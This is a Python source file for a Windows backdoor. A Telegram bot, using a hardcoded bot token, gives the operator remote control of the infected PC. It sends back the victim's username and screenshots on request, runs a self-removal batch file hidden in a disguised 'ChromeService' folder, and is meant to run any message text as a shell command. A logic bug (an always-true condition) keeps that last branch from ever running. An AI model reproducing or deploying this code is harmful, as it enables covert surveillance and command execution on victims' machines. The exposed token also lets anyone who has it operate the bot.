from telegram.ext import Updater,CommandHandler,MessageHandler,Filters
import os
import pyautogui

TOKEN = "5913616404:AAFW9HlRZqCEmh3EgBe8pOfVayRiz_zxvPM"

def start(update,context):
    username = ""
    req = os.popen("echo %username%")

    for us in req:
        username+= us

    update.message.reply_text(f"Connection Established => {username} PC")

def answer(update,context):
    txt = update.message.text.lower()

    if "savescreen" in txt:

        img = pyautogui.screenshot()
        img.save("photo.png")

        update.message.reply_photo(open("photo.png","rb"))
    
    elif "killswitch" in txt:
        os.system("move C:\\Users\\%username%\\AppData\\Local\\Programs\\ChromeService\\updater.bat C:\\Users\\%username%\\AppData\\Local\\Programs\\")
        os.system("C:\\Users\\%username%\\AppData\\Local\\Programs\\updater.bat")
        
        update.message.reply_text("Backdoor Deleted !")
    
    elif "download-setVol":
        os.system("echo off")
        
    else:
        try:
                
            command = ""
            response = os.popen(txt)

            msg = update.message.reply_text("Command is Executing....")
            
            for line in response:
                command+= line
            
            msg.edit_text(command)
        
        except Exception as e:
            msg.edit_text(e)
        
updater = Updater(TOKEN)
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(MessageHandler(Filters.text, answer))
print("Bot is listening....")
updater.start_polling()
